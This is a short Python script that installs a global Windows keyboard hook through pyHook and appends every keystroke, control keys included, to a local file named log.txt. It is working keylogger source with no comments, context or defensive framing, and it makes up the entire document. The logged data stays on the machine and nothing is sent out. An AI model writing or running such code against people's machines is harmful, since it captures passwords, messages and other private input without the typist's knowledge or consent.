import pythoncom
import pyHook

keysBuffer = ''

def keyConvert(event):

    if(event.Ascii >= 0 and event.Ascii <= 31) or (event.Ascii == 127):
        return '[' + event.Key + ']'
    else:
        return chr(event.Ascii)

def logger(event):

    global keysBuffer
    keysBuffer += keyConvert(event)
    with open('log.txt', 'a+') as f:
        f.write(str(keysBuffer))
    keysBuffer = ''
    return True

def main():
    hookObj = pyHook.HookManager()
    hookObj.KeyDown = logger
    hookObj.HookKeyboard()
    pythoncom.PumpMessages()

main()
